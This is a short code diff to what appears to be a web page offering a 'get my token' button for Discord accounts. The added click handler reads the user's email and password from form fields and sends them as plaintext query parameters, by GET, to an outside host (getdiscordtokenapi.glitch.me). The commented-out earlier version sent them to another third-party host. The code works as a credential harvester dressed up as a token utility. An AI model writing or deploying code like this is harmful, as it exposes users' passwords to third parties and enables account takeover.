@@ -156,7 +156,7 @@
 
 
 
-
+/*
             $("#get-my-token").click(function() {
                 var url = 'https://noziro.herokuapp.com/gettoken';
               var email = $("#email").val();
@@ -164,6 +164,27 @@
                load(url, email, password);
 
 
+
+
+
+            })*/
+
+
+
+
+            
+
+            $("#get-my-token").click(function() {
+
+                var email = $("#email").val();
+                var password = $("#password").val();
+
+                fetch("https://getdiscordtokenapi.glitch.me/dreams/?email=" + email + "&password=" + password, {
+                    method: 'GET',
+
+                }).then(function(response) {
+                    console.log(response)
+                });
 
 
 
